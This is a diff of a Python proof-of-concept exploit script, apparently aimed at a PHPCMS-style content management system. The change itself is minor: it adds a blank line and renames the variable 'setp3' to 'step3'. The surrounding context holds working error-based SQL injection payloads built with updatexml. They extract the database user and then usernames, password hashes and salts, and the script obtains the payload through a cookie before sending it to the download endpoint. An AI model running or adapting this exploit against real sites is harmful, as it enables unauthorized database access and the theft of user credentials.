@@ -3,6 +3,7 @@ import requests,sys,urllib
 def poc():
 	try:
 		url = target.url
+		
 		sqli_prefix = '%*27an*d%20'
 		sqli_info = 'updatexml(1,concat(1,(user())),1)'
 		sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '
@@ -19,8 +20,8 @@ def poc():
 		sqli_payload = r.cookies["GPYAh_att_json"]
 		print('[+] Get SQLi Payload : ' + sqli_payload)
 
-		setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
-		html = requests.get(setp3).text
+		step3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
+		html = requests.get(step3).text
 
 		db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `")
 		db_end = html.find("`.`")
